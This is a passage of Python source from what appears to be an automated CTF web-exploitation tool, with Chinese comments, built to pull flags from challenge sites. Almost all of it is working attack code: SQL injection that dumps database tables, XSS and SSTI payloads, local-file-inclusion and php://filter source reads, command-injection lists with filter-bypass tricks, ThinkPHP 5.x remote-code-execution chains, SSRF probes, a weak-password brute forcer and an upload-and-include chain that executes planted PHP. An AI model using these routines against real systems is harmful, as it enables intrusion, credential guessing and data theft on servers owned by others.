    tables = _union_run(
        ctx, target, cols,
        "SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables"
        " WHERE table_schema=database()", quote=quote)
    # 返回值里混着我们的 payload（SELECT/FROM/GROUPCONCAT）说明查询被回显/剥字符，
    # 典型是下划线 WAF：information_schema 写不出来，改走无下划线猜表。
    if (tables and re.search(r"SELECT|FROM|GROUPCONCAT", tables)) or \
            (db and "SELECT" in db):
        ctx.log("[deep] UNION 回显含 payload 残片，疑似字符过滤，转无下划线猜表")
        ctx.add("sqli-filter", target["url"], evidence="UNION 回显被剥字符（疑似下划线 WAF）",
                confidence="medium")
        _union_flag_guess(ctx, target, cols, quote)
        return
    if not tables:
        _union_flag_guess(ctx, target, cols, quote)
        return
    names = [t.strip() for t in tables.split(",") if t.strip()]
    ctx.add("sqli-union", target["url"],
            payload="0 UNION SELECT ...", evidence="库 %s；表 %s" % (db or "?", tables[:120]),
            confidence="high")
    # 含 flag 字样的表优先，其余按字母序取前几个（用户已授权完整取数）
    picked = [t for t in names if "flag" in t.lower()] or names[:UNION_TABLES_MAX]
    for table in picked[:UNION_TABLES_MAX]:
        ccols = _union_run(
            ctx, target, cols,
            "SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns"
            " WHERE table_schema=database() AND table_name='%s'" % table, quote=quote)
        cols_list = [c.strip() for c in (ccols or "").split(",") if c.strip()][:UNION_ROWS_MAX]
        if not cols_list:
            continue
        expr = "SELECT GROUP_CONCAT(%s SEPARATOR ' | ') FROM %s" % (
            ",".join("IFNULL(`%s`,'')" % c for c in cols_list), table)
        data = _union_run(ctx, target, cols, expr, tag="CBD", quote=quote)
        if not data:
            continue
        flags = collect_flags(data)
        if flags:
            for flag in flags:
                ctx._add_flag(flag, target["url"])
            ctx.add("flag-read", target["url"], payload=expr[:120],
                    evidence="UNION 从表 %s 读到 %s" % (table, flags[0][:40]))
            ctx.log("[deep] UNION 命中 flag：%s（表 %s）" % (flags[0], table))
            return
        ctx.log("[deep] UNION 表 %s 数据（前 120 字）：%s" % (table, _snippet(data, 120)))


def _xpath_string(text):
    """从 XPATH 报错里取被 ~ 包住的片段，并剥掉 SQL 引号/HTML 尾巴。"""
    m = re.search(r"~([^~<\n]*)", text)
    if not m:
        return ""
    return re.sub(r"[^A-Za-z0-9_{}\-]", "", m.group(1))[:80]


def sqli_error_dump(ctx, target):
    """报错注入取数：updatexml 把查询结果拼进 XPATH 报错。
    每次只取 24 字符，从 1 开始分片拼，直到出现 }；不拼接首次截断的整段，
    否则会得到「前半段 + 后半段」的重复串。"""
    heads = ["1 and ", "1' and ", "1\" and "]
    tails = ["", "#", ")#"]
    for head in heads:
        for tail in tails:
            total = ""
            for off in range(1, 220, 24):
                expr = ("updatexml(1,concat(0x7e,substr((select flag from flag),%d,24),0x7e),1)"
                        % off)
                item = send_value(ctx, target, head + expr + tail)
                val = _xpath_string(text_of(item))
                if not val:
                    break
                total += val
                if "}" in total:
                    break
            flags = collect_flags(total)
            if flags:
                for f in flags:
                    ctx._add_flag(f, target["url"])
                ctx.add("flag-read", target["url"], payload="updatexml substr error-based",
                        evidence="报错注入读出 flag：%s" % flags[0])
                ctx.log("[deep] 报错注入命中 flag：%s" % flags[0])
                return True
    return False


_XSS_BROWSER_JS = r"""
import sys
from playwright.sync_api import sync_playwright
u = sys.argv[1]
hit = []
with sync_playwright() as pw:
    b = pw.chromium.launch(headless=True, args=["--no-sandbox"])
    pg = b.new_page()
    def on_dialog(d):
        hit.append(1)
        try:
            d.dismiss()
        except Exception:
            pass
    pg.on("dialog", on_dialog)
    try:
        pg.goto(u, timeout=8000, wait_until="domcontentloaded")
    except Exception:
        pass
    pg.wait_for_timeout(1400)
    b.close()
print("XSS_DIALOG" if hit else "XSS_NONE")
"""


def browser_xss_confirm(url, timeout=22):
    """用本机 Playwright 真跑一次页面，看 alert 是否弹出。

    便携 exe 自身没有 playwright 时，退回到 D:\\PY\\python.exe；两者都没有就
    返回 False，保持“只检测不夸口”的口径。
    """
    py = None
    if not getattr(sys, "frozen", False):
        py = sys.executable
    else:
        for cand in (os.environ.get("MOHE_PYTHON"), r"D:\PY\python.exe"):
            if cand and os.path.isfile(cand):
                py = cand
                break
    if not py:
        return False
    fd, path = tempfile.mkstemp(suffix=".py", prefix="mohe_xss_")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(_XSS_BROWSER_JS)
        out = subprocess.run([py, path, url], capture_output=True, text=True,
                             timeout=timeout, encoding="utf-8", errors="ignore")
        return "XSS_DIALOG" in (out.stdout or "")
    except Exception:
        return False
    finally:
        try:
            os.remove(path)
        except Exception:
            pass


def test_xss(ctx, target):
    for payload in XSS_PAYLOADS:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if payload in text:
            idx = text.find(payload)
            near = text[max(0, idx - 40):idx + len(payload) + 40]
            ctx.add("xss-reflected", item["url"], payload=payload,
                    evidence="payload 原样回显（上下文）：" + _snippet(near, 160))
            if payload.startswith("<script>") and not getattr(ctx, "_xss_browser", False):
                ctx._xss_browser = True
                if browser_xss_confirm(item["url"]):
                    ctx.add("xss-exec", item["url"], payload=payload,
                            evidence="Playwright 实际打开页面，alert 弹窗触发（浏览器确证）")
                    ctx.log("[deep] XSS 浏览器确证：alert 已执行")
            return
        if "&lt;script" in text or "&lt;img" in text:
            ctx.add("xss-escaped", item["url"], payload=payload,
                    evidence="payload 被 HTML 实体编码（已过滤）", confidence="low")
            return


def test_lfi(ctx, target):
    for payload in TRAVERSAL_PAYLOADS:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if collect_flags(text):
            ctx.add("lfi", item["url"], payload=payload,
                    evidence="伪协议/穿越路径直接读出 flag 内容")
            return
        mark = next((m for m in LFI_MARKS if m in text), None)
        if mark:
            ctx.add("lfi", item["url"], payload=payload, evidence=mark)
            if not _lfi_flag_hunt(ctx, target):
                # 常见路径读不到 flag：能把 /etc/passwd 读出来就能把代码读进去执行
                lfi_code_exec(ctx, _exec_fire(ctx, target),
                              note="（%s 参数可包含文件）" % target["param"])
            return
        if item.get("status") == 200 and len(text) < 30000:
            for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text):
                try:
                    dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
                except Exception:
                    continue
                dec_flags = collect_flags(dec.decode("utf-8", "ignore"))
                if dec_flags:
                    # 这里以前只 add("flag-read") 不 _add_flag：结论说「读出 flag」，
                    # 结果里却没有 flag 值，提交环节拿不到任何东西（现场 LFI 题白跑就在此）。
                    for f in dec_flags:
                        ctx._add_flag(f, item["url"] + "（php://filter 源码）")
                    ctx.add("flag-read", item["url"], payload=payload,
                            evidence="php://filter 源码中读出 flag")
                    return
                if b"<?php" in dec or b"<?=" in dec:
                    ctx.add("lfi-source", item["url"], payload=payload,
                            evidence="php://filter 读出 PHP 源码 %d 字节" % len(dec))
                    for flag in collect_flags(dec.decode("utf-8", "replace")):
                        ctx._add_flag(flag, item["url"] + "（源码内）")
                    if not ctx.flags:
                        _src_stage_exec(ctx, target, dec.decode("utf-8", "replace"), payload)
                    return
    # php://filter 读取常见脚本源码
    for name in PHP_FILTER_TARGETS:
        payload = "php://filter/convert.base64-encode/resource=" + name
        item = send_value(ctx, target, payload)
        text = text_of(item)
        got = 0
        src_txt = ""
        for blob in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", text):
            try:
                dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
            except Exception:
                continue
            if b"<?php" in dec:
                got = len(dec)
                src_txt = dec.decode("utf-8", "replace")
                for flag in collect_flags(src_txt):
                    ctx._add_flag(flag, item["url"] + "（%s 源码）" % name)
        if got:
            ctx.add("lfi-source", item["url"], payload=payload,
                    evidence="读出 %s 源码 %d 字节" % (name, got))
            if not ctx.flags:
                if not _src_stage_exec(ctx, target, src_txt, payload):
                    lfi_code_exec(ctx, _exec_fire(ctx, target),
                                  note="（%s 参数可包含文件）" % target["param"])
            return


def _lfi_flag_hunt(ctx, target):
    """一旦确认文件读取，直接按常见 flag 路径定向读一遍；读到就返回 True。"""
    tried = 0
    for path in FLAG_PATHS:
        if tried >= 4:
            return False
        tried += 1
        item = send_value(ctx, target, path)
        flags = collect_flags(text_of(item))
        if flags:
            for flag in flags:
                ctx._add_flag(flag, item["url"] + "（LFI 读 " + path + "）")
            return True
    return False


def ssti_read_flag(ctx, target):
    """模板注入确认后只读取数：全部是 popen('cat …') 一类读命令，不写文件、不改配置。

    Jinja2 的 __globals__ 链最常见所以排在最前；下划线被剥的站点这几条会失效，
    那种情况由后面的读文件/命令注入矩阵兜底。
    """
    for cmd in SSTI_READ_CMDS[:2]:
        for label, tpl in SSTI_RCE_TPL:
            if ctx.budget.used + 2 >= ctx.budget.max_requests:
                return False
            payload = tpl % cmd
            item = send_value(ctx, target, payload)
            text = text_of(item)
            flags = collect_flags(text)
            if flags:
                for f in flags:
                    ctx._add_flag(f, item["url"])
                ctx.add("flag-read", item["url"], payload=payload[:140],
                        evidence="SSTI(%s) 执行 `%s` 读到 %s" % (label, cmd, flags[0][:40]))
                ctx.log("[deep] SSTI(%s) 命中 flag：%s" % (label, flags[0][:60]))
                return True
    return False


def test_ssti(ctx, target):
    for payload, expect, engine in SSTI_CASES:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if expect in text:
            # 交叉验证：换一个算式，两个结果都对才算数，排除页面本来就含该数字
            second, expect2 = "{{192*7919}}", "1520448"
            if payload.startswith("${"):
                second, expect2 = "${192*7919}", "1520448"
            elif payload.startswith("<%="):
                second, expect2 = "<%=192*7919%>", "1520448"
            elif payload.startswith("#{"):
                second, expect2 = "#{192*7919}", "1520448"
            elif payload.startswith("{") and not payload.startswith("{{"):
                # Smarty 只认单花括号； "{{" 若落到这条分支，Jinja2 目标永远验证不过
                second, expect2 = "{192*7919}", "1520448"
            item2 = send_value(ctx, target, second)
            if expect2 in text_of(item2):
                ctx.add("ssti", item["url"], payload="%s（%s）" % (payload, engine),
                        evidence="两个乘积都被求值：%s / %s" % (expect, expect2))
                ssti_read_flag(ctx, target)
                return


def test_cmdi(ctx, target):
    # 先确认页面是否会原样回显输入：会回显就不能把「看到标记」当成执行，
    # 但算术 payload 仍然可以测——$((9137+1)) 只有被 shell 求值才会变成 9138。
    neutral = send_value(ctx, target, CMDI_PROBE)
    reflected = CMDI_PROBE in text_of(neutral)
    for payload in CMDI_PAYLOADS:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if CMDI_EXPECT in text:
            ctx.add("cmdi", item["url"], payload=payload,
                    evidence="算术由 shell 求值：%s%s"
                             % (CMDI_EXPECT, "（页面同时回显输入，仍判执行）" if reflected else ""))
            cmdi_read_flag(ctx, target)
            return
    if reflected:
        ctx.add("reflected-only", neutral["url"], payload=CMDI_PROBE,
                evidence="参数被原样回显，且算术 payload 未被求值，无法据此判定命令执行",
                confidence="low")
        return
    # 算术 payload 全被过滤规则挡掉时（ping 类题常拉黑空格/括号/引号），
    # 改用无空格原生命令的输出特征判定执行。
    base = _strip(text_of(neutral))
    prefixes = [t for t in dict.fromkeys([target.get("value") or "", "127.0.0.1"]) if t]
    for payload in CMDI_EXEC_PROBES:
        for pfx in prefixes:
            item = send_value(ctx, target, pfx + payload)
            if not item:
                continue
            block = _cmdi_block(text_of(item))
            sig = next((s for s in CMDI_EXEC_SIGS if s in block), "")
            if sig and block != base:
                ctx.add("cmdi", item["url"], payload=pfx + payload,
                        evidence="无空格原生命令被执行，输出特征 %r" % sig)
                cmdi_read_flag(ctx, target)
                return


WEAK_CREDS = [("admin", "admin"), ("admin", "123456"), ("admin", "admin888"),
              ("admin", "password"), ("root", "root"), ("root", "123456"),
              ("test", "test"), ("guest", "guest")]


def test_login(ctx, fp):
    """弱口令：只在页面确实有账号/密码表单时试小字典，最多 8 次请求。"""
    jobs = [f for f in (fp.get("forms") or []) if len(f.get("fields") or {}) >= 2]
    if not jobs:
        return []
    hits = []
    for form in jobs[:1]:
        names = list(form["fields"].keys())
        user_key = next((k for k in names
                         if re.search(r"(?i)user|name|account|login|email", k)), names[0])
        pass_key = next((k for k in names
                         if re.search(r"(?i)pass|pwd|secret", k)), names[-1])
        base_item = ctx.get(form["action"])
        base_len = len(text_of(base_item))
        # v4.1：robots/静态文件泄露的密钥比通用弱口令更可信，先试。
        creds = []
        for sec in list(getattr(ctx, "leaked_secrets", []) or [])[:3]:
            creds += [("admin", sec), (sec, sec), ("admin", "admin" + sec)]
        creds += [c for c in WEAK_CREDS if c not in creds]
        for user, pwd in creds[:12]:
            fields = dict(form["fields"])
            fields[user_key] = user
            fields[pass_key] = pwd
            item = ctx.post_form(form["action"], fields, referer=ctx.url)
            body = text_of(item)
            status = item.get("status")
            if status in (0, 500, 502, 503):
                continue
            ok = False
            if status in (301, 302, 303):
                loc = item.get("location") or ""
                if loc and not re.search(r"(?i)login|signin|error|fail", loc):
                    ok = True
            if re.search(r"(?i)(登录成功|登陆成功|login success|welcome back|退出登录|logout|注销)", body):
                ok = True
            if re.search(r"(?i)(用户名或密码错误|密码错误|登录失败|invalid credentials|wrong password)", body):
                ok = False
            # 登录页本身也常写“管理后台/dashboard”，不能拿静态词当成功标志；
            # 只认 flag 出现、或明确的退出登录入口、或长度明显变化且无错误提示。
            flag_hit = re.search(r"(?i)ctfhub\{|flag\{", body) and not re.search(r"(?i)ctfhub\{|flag\{", text_of(base_item))
            if flag_hit:
                ok = True
            if not ok and abs(len(body) - base_len) > 120 and status == 200 and \
                    re.search(r"(?i)(logout|退出登录|注销)", body):
                ok = True
            if ok:
                ctx.add("weak-login", form["action"], confidence="medium",
                        evidence="账号 %s / 密码 %s 登录成功（以回显/跳转为据）" % (user, pwd))
                ctx.log("[deep] 弱口令命中：%s / %s（%s）" % (user, pwd, form["action"]))
                hits.append({"url": form["action"], "user": user, "password": pwd})
                collect_flags(body)
                return hits
    return hits


CMDI_FLAG_CMDS = [";cat /flag", ";cat$IFS/flag", ";tac /flag", ";head -n1 /flag",
                  "/bin/cat /flag", ";c'a't /flag", ";cat /var/www/html/flag.php",
                  ";cat /flag.txt", ";cat /flag.php",
                  ";cat /root/flag.txt", ";cat /flag_is_here", ";ls /",
                  ";ls -la /var/www/html", ";ls -la /home",
                  ";find /var/www -maxdepth 3 -type f",
                  ";grep -rhoE 'ctfhub{[^}]+}' /var/www /home /tmp 2>/dev/null",
                  "|cat /flag", "&&cat /flag",
                  # 过滤 ; | 空格 时的换行变体（$IFS 代替空格）
                  "\ncat$IFS/flag", "\ncat</flag", "\ntac</flag", "\nhead</flag",
                  "\ncat$IFS/flag.txt", "\ncat$IFS/flag.php",
                  "\ncat$IFS/var/www/html/flag.php", "\nls$IFS/",
                  "\nls$IFS-la$IFS/var/www/html",
                  # 只拉黑空格与符号、但 ; | 仍可分隔的题：整条命令不能出现空格
                  ";id;cat$IFS$9/flag", "|cat$IFS$9/flag", "|tac$IFS$9/flag",
                  "|ls", ";ls$IFS$9-a", "|ls$IFS$9-la", "|nl$IFS$9/flag",
                  "|more$IFS$9/flag", "|head$IFS$9-1$IFS$9/flag",
                  "|cat$IFS$9flag.php", "|base64$IFS$9flag.php", "|tac$IFS$9flag.php"]


def _cmdi_block(body):
    """只取命令输出区块：Array( 到源码高亮/页面尾部之间。
    该题 show_source(__FILE__) 会把源码整段转义打印，整页文本会淹没真实回显。"""
    i = body.find("Array")
    if i < 0:
        return body
    tail = body[i:]
    for mark in ("&lt;?php", "<?php", "show_source", "</pre>"):
        j = tail.find(mark)
        if j > 0:
            return tail[:j]
    return tail


B64_RE = re.compile(r"[A-Za-z0-9+/]{20,}={0,2}")


def _b64_flags(body):
    """命令回显里常出现 base64（cat 二进制/防转义），解一层再扫 flag，返回命中的 flag 列表。"""
    out = []
    for tok in B64_RE.findall(body)[:40]:
        try:
            raw = base64.b64decode(tok + "=" * (-len(tok) % 4))
        except Exception:
            continue
        if b"ctfhub{" in raw or b"flag{" in raw:
            for flag in collect_flags(raw.decode("utf-8", "ignore")):
                if flag not in out:
                    out.append(flag)
    return out


def _cmdi_php_files(body):
    names = re.findall(r"[A-Za-z0-9_.-]+\.php", body)
    return [n for n in names if n not in ("index.php",)][:6]


def _split_keyword_payloads(name, seps=(";", "|")):
    """文件名本身被关键字过滤（如 .*f.*l.*a.*g.*）时，把其中一个字母换成 shell 变量，
    再用赋值语句补回来：命令行里不再出现被拉黑的词，也不需要任何被禁符号。"""
    out = []
    idx = [i for i, ch in enumerate(name) if ch.lower() in "flag"] or range(len(name))
    for sep in seps:
        for i in list(idx)[:6]:
            ch = name[i]
            if not ch.isalpha():
                continue
            alt = name[:i] + "$a" + name[i + 1:]
            out.append("%sa=%s%scat$IFS$9%s" % (sep, ch, sep, alt))
    return out[:12]


def cmdi_read_flag(ctx, target):
    """命令注入成立后：固定路径 -> 目录列表 -> 关键字拆分 -> 源码 grep -> base64 兜底。"""
    for cmd in CMDI_FLAG_CMDS:
        item = send_value(ctx, target, "127.0.0.1" + cmd)
        if not item:
            continue
        body = text_of(item)
        block = _cmdi_block(body)
        flags = collect_flags(block) + _b64_flags(block)
        if flags:
            for flag in flags:
                ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
            ctx.log("[deep] 命令注入读 flag 成功：%s" % cmd)
            return True
        if cmd == ";ls /":
            for name in re.findall(r"[A-Za-z0-9_.-]*flag[A-Za-z0-9_.-]*", block):
                item2 = send_value(ctx, target, "127.0.0.1;cat /" + name)
                if item2 and collect_flags(_cmdi_block(text_of(item2))):
                    ctx.log("[deep] 按目录列表读到 /%s" % name)
                    return True
        if cmd.startswith(";ls -la /var/www"):
            for name in _cmdi_php_files(block):
                for c2 in (";cat /var/www/html/" + name,
                           ";base64 /var/www/html/" + name,
                           ";tac /var/www/html/" + name,
                           ";sort /var/www/html/" + name,
                           ";nl /var/www/html/" + name):
                    item3 = send_value(ctx, target, "127.0.0.1" + c2)
                    if not item3:
                        continue
                    b3 = _cmdi_block(text_of(item3))
                    flags3 = collect_flags(b3) + _b64_flags(b3)
                    if flags3:
                        for flag in flags3:
                            ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
                        ctx.log("[deep] 命令注入读 flag 成功：%s" % c2)
                        return True

    # 目录列举驱动：路径里的 / 被拉黑、只能读当前目录文件名时，先列目录再逐个试读；
    # 文件名本身命中关键字过滤的，再用「变量替换掉一个字母」的写法绕一次。
    def _read(payload, tag):
        item = send_value(ctx, target, "127.0.0.1" + payload)
        if not item:
            return False
        block = _cmdi_block(text_of(item))
        got = collect_flags(block) + _b64_flags(block)
        if got:
            for flag in got:
                ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
            ctx.log("[deep] 命令注入读 flag 成功：%s（%s）" % (payload, tag))
            return True
        return False

    listed = []
    for lcmd in ("|ls", ";ls", "|ls$IFS$9-a", ";ls$IFS$9-a", "|dir"):
        item = send_value(ctx, target, "127.0.0.1" + lcmd)
        if not item:
            continue
        block = _cmdi_block(text_of(item))
        for nm in re.findall(r"[A-Za-z0-9_.-]{2,60}", block):
            if nm not in (".", "..") and nm not in listed:
                listed.append(nm)
        if listed:
            ctx.log("[deep] 命令注入列目录（%s）得到 %s" % (lcmd, listed[:12]))
            break
    prio_names = [nm for nm in listed if "flag" in nm.lower() or "f1ag" in nm.lower()]
    for nm in (prio_names or listed)[:5]:
        for rcmd in ("|cat$IFS$9", ";cat$IFS$9", "|base64$IFS$9", "|more$IFS$9"):
            if _read(rcmd + nm, "直读"):
                return True
        if "flag" in nm.lower():
            for payload in _split_keyword_payloads(nm)[:8]:
                if _read(payload, "关键字拆分"):
                    return True
    return False


def _thinkphp_urls(ctx):
    root = ctx.root.rstrip("/")
    return [root + "/index.php", root + "/", root + "/public/index.php"]


def _thinkphp_payloads(ctx, cmd):
    """ThinkPHP 5.0/5.1 的 invokefunction 链，只执行只读命令。"""
    return [
        [("s", "index/think\\app/invokefunction"),
         ("function", "call_user_func_array"),
         ("vars[0]", "system"), ("vars[1][]", cmd)],
        [("s", "index/\\think\\app/invokefunction"),
         ("function", "call_user_func_array"),
         ("vars[0]", "system"), ("vars[1][]", cmd)],
        [("s", "index/think\\Request/input"),
         ("filter[]", "system"), ("data", cmd)],
    ]


def test_thinkphp(ctx, target=None):
    """ThinkPHP 5.x 框架 RCE（N1BOOK「thinkphp 代码执行」类题）。

    只在参数名是 s、或题目描述明确写 ThinkPHP 时触发，避免普通题被这套
    路径矩阵占预算。命中后用同一个 invokefunction 链读 flag。
    """
    desc = (getattr(ctx, "description", "") or "").lower()
    pname = (target or {}).get("param", "")
    if pname != "s" and "thinkphp" not in desc:
        return
    marker = "CTFBOX9138"
    cmds = ["echo CTFBOX$((9137+1))",
            "cat /flag* /flag.txt flag.php 2>/dev/null; env | grep -i flag"]
    seen_urls = set()
    for cmd in cmds:
        for base in _thinkphp_urls(ctx):
            for pairs in _thinkphp_payloads(ctx, cmd):
                url = base + "?" + urlencode(pairs)
                if url in seen_urls:
                    continue
                seen_urls.add(url)
                item = ctx.get(url)
                text = text_of(item)
                if collect_flags(text):
                    ctx.add("thinkphp-rce", item["url"], payload=pairs[0][1],
                            evidence="ThinkPHP invokefunction 执行 `%s` 读到 flag" % cmd)
                    return True
                if marker in text:
                    ctx.add("thinkphp-rce", item["url"], payload=pairs[0][1],
                            evidence="ThinkPHP invokefunction 命令执行成功（%s）" % marker)
                    ctx.log("[deep] ThinkPHP RCE 成立：%s" % item["url"][:120])
                    return True
    return False


def _ssrf_probes(ctx):
    """题目描述里常直接写内网端口和路径（N1BOOK Python SSRF 就是 8000/api/internal/secret），
    把它们变成真实探测目标，而不是只扫 80 端口的 flag.php。"""
    probes = [("http://127.0.0.1:%s/" % (urlsplit(ctx.url).port or 80), "本机回环"),
              ("http://127.0.0.1/", "本机回环"),
              ("http://127.0.0.1/flag.php", "本机 flag.php"),
              ("http://127.0.0.1/flag.txt", "本机 flag.txt"),
              ("http://127.0.0.1:80/flag.php", "本机 80 端口 flag.php"),
              ("http://localhost/flag.php", "localhost flag.php"),
              ("http://127.0.0.1:8000/", "本机 8000 端口"),
              ("http://127.0.0.1:8000/api/internal/secret", "本机 8000 内部接口"),
              ("http://localhost:8000/api/internal/secret", "localhost 8000 内部接口")]
    desc = getattr(ctx, "description", "") or ""
    ports = re.findall(r"(?i)(?:端口|port|:)\s*(\d{2,5})", desc)
    paths = re.findall(r"(?<![\w.])/(?:api|internal|admin|secret|flag|debug)"
                       r"[A-Za-z0-9_\-./]{0,60}", desc)
    for port in ports[:3]:
        if not (1 <= int(port) <= 65535):
            continue
        for path in (paths[:3] or ["/", "/api/internal/secret"]):
            probes.append(("http://127.0.0.1:%s%s" % (port, path), "描述提示 %s 端口" % port))
    for path in paths[:4]:
        probes.append(("http://127.0.0.1:8000" + path, "描述提示路径 " + path))
        probes.append(("http://127.0.0.1" + path, "描述提示路径 " + path))
    out, seen = [], set()
    for payload, label in probes:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, label))
    return out


def test_ssrf(ctx, target):
    if not re.search(r"(?i)(url|uri|link|src|dest|target|redirect|next|image|file|path|load)",
                    target["param"]):
        return
    probes = _ssrf_probes(ctx)
    for payload, label in probes:
        item = send_value(ctx, target, payload)
        text = text_of(item)
        if collect_flags(text):
            ctx.add("ssrf", item["url"], payload=payload,
                    evidence="SSRF 读取内部资源 %s 命中 flag" % label)
            return
        mark = next((m for m in LFI_MARKS if m in text), None)
        if mark:
            if payload.startswith("file://"):
                # file:// 成功是本地文件包含（包装器），不是服务端出网请求，别混为一类
                ctx.add("lfi-wrapper", item["url"], payload=payload,
                        evidence="file:// 包装器读取成功：%s" % mark)
            else:
                ctx.add("ssrf", item["url"], payload=payload,
                        evidence="%s 读取成功：%s" % (label, mark))
            return
        if "connection refused" in text.lower() or "failed to connect" in text.lower():
            ctx.add("ssrf-possible", item["url"], payload=payload,
                    evidence="服务端出现连接错误（%s），可能存在出网请求" % label,
                    confidence="low")
            return


# ---------------------------------------------------------------------------
# 文件上传
# ---------------------------------------------------------------------------
def upload_relocate(ctx, form, token_name, text):
    """上传 2xx 却按原名找不到载荷时（改名题）：从响应正文和上传目录列表反查真实存储名。

    只认「回显了我们标记串」的那一个，所以多花的列目录请求不会变成误报。
    """
    stem = (token_name.split(".")[0] or "x")[:6].lower()
    cands = []
    for mo in re.finditer(r"""['"(/]([A-Za-z0-9_./\-]{1,80}?\.(?:php\d?|phtml|phar|asp|aspx|jsp))"""
                          r"""(?=['"?\s>&]|$)""", text or "", re.I):
        u = urljoin(form["action"], mo.group(1).lstrip("./"))
        if _same_origin(ctx.url, u) and u not in cands:
            cands.append(u)
    for d in UPLOAD_DIRS[:3]:
        if ctx.budget.used + 4 >= ctx.budget.max_requests:
            break
        dir_url = ctx.root.rstrip("/") + "/" + d + "/"
        item = ctx.get(dir_url, referer=form["action"])
        if item.get("status") != 200 or item.get("error"):
            continue
        listing = text_of(item)
        if "index of" not in listing.lower():
            continue
        found = re.findall(r'href="([^"/?#]{2,80}?\.(?:php\d?|phtml|asp|aspx|jsp))"', listing, re.I)
        found.sort(key=lambda n: 0 if stem in n.lower() else 1)
        for n in found[:3]:
            u = dir_url + n
            if u not in cands:
                cands.append(u)
    for u in cands[:6]:
        got = ctx.get(u, referer=form["action"])
        body = text_of(got)
        if UPLOAD_MARK in body:
            return u, ("<?php" not in body and "<%=" not in body)
    return "", False


def _lfi_include_params(fp):
    """上传×包含联动要试的参数名：源码里抽到的 GET 名最可信，补少量常见包含名。"""
    names = []
    for n in list((fp or {}).get("src_get") or []) + list((fp or {}).get("js_params") or []):
        if n and n not in names:
            names.append(n)
    for n in ("file", "page", "include", "path", "p"):
        if n not in names:
            names.append(n)
    return names[:4]


def _upload_stored_paths(token_name, text):
    """上传后文件可能的落盘路径：响应正文里出现的 + 常见上传目录 + 原名。"""
    paths = []
    for mo in re.finditer(r"[./\\]?[A-Za-z0-9_./-]*" + re.escape(token_name), text or ""):
        p = mo.group(0).lstrip("./")
        if p and p not in paths:
            paths.append(p)
    for d in UPLOAD_DIRS[:5]:
        p = d + "/" + token_name
        if p not in paths:
            paths.append(p)
    if token_name not in paths:
        paths.append(token_name)
    return paths[:8]


def _read_flag_via_lfi(ctx, form, field, param, stored_path, ctype):
    """联动命中后再放只读取 flag 脚本，用同一个包含参数访问它。"""
    name = "read" + ctx.token + ".php"
    fields = {k: v for k, v in form["fields"].items() if k != field}
    item = ctx.post_multipart(form["action"], fields, field, name, FLAG_READER_PHP,
                              ctype, referer=ctx.url)
    if item.get("status") not in (200, 201, 204, 301, 302):
        ctx.log("[deep] 联动取 flag 脚本上传失败（HTTP %s）" % item.get("status"))
        return
    dirname = stored_path.rsplit("/", 1)[0] if "/" in stored_path else ""
    target_path = (dirname + "/" if dirname else "") + name
    u = ctx.root.rstrip("/") + "/?" + urlencode({param: target_path})
    got = ctx.get(u, referer=form["action"])
    body = text_of(got)
    flags = collect_flags(body)
    if flags:
        for fl in flags:
            ctx._add_flag(fl, u)
        ctx.add("flag-read", u, payload=name,
                evidence="上传×包含联动执行取 flag 脚本，命中 " + flags[0][:40])
        ctx.log("[deep] 联动取 flag 命中 %s" % flags[0][:60])
    else:
        ctx.log("[deep] 联动取 flag 脚本已执行，固定路径里没有 flag")


def upload_lfi_chain(ctx, fp, form, field, token_name, text, results, ctype, label):
    """上传 2xx 却按原名访问不到载荷时，用页面源码里的文件包含参数 include 刚上传的文件。

    现场 N1BOOK「文件上传」：源码抽出 GET file，8 种载荷全部 HTTP 200，
    但 8 个候选存储路径一个都不回显标记——真解法是把落盘路径交给 ?file= 包含执行。
    老引擎把「上传」和「LFI」当成两条互不相干的链，各自都跑完了却没把前者的输出
    喂给后者。这里补的是跨阶段联动，参数名与路径都来自上一阶段的产物，不是写死常量。
    """
    names = _lfi_include_params(fp)
    if not (fp.get("src_get") or fp.get("js_params")):
        return False
    paths = _upload_stored_paths(token_name, text)
    tried = 0
    for name in names:
        for p in paths[:6]:
            if tried >= 14 or ctx.budget.used + 2 >= ctx.budget.max_requests:
                return False
            u = ctx.root.rstrip("/") + "/?" + urlencode({name: p})
            got = ctx.get(u, referer=form["action"])
            body = text_of(got)
            tried += 1
            if UPLOAD_MARK not in body or "<?php" in body or "<%=" in body:
                continue
            ctx.log("[deep] 上传×包含联动命中：?%s=%s 执行了上传载荷（%d 发）"
                    % (name, p, tried))
            ctx.add("upload-lfi-exec", u, payload=token_name,
                    evidence="%s 落盘后由页面源码里的 %s 参数包含执行（回显 %s）"
                             % (label, name, UPLOAD_MARK))
            results.append({"url": u, "filename": token_name, "exec": True,
                            "form": form["action"], "kind": label + " + LFI",
                            "ctype": ctype})
            for fl in collect_flags(body):
                ctx._add_flag(fl, u)
            _read_flag_via_lfi(ctx, form, field, name, p, ctype)
            return True
    return False


def _upload_urls_from_response(text, token_name):
    """从上传响应里抽取落盘 URL：HTML 属性、裸文件名、JSON 字段都认。

    经典缺口：很多上传脚本回 JSON（{"url":"/uploads/x.php"} 或 {"path":"uploads/x.php"}），
    旧代码只认 `url=`/``href=`` 这类 HTML 属性，漏掉 JSON，导致 shell 虽上传成功却找不到位置。
    """
    stem = token_name.split(".", 1)[0]
    saved = []
    for mo in re.finditer(r"(?i)(?:src|href|url|path|file|link)\s*[=:]\s*['\"]?([^'\"\s>}\],]+)", text):
        u = mo.group(1)
        if stem in u:
            saved.append(u)
    for mo in re.finditer(r"[./\\]?[A-Za-z0-9_./\-]*" + re.escape(token_name), text):
        saved.append(mo.group(0))
    try:
        j = json.loads(text.strip())

        def _walk(o):
            if isinstance(o, str) and stem in o:
                saved.append(o)
            elif isinstance(o, dict):
                for v in o.values():
                    _walk(v)
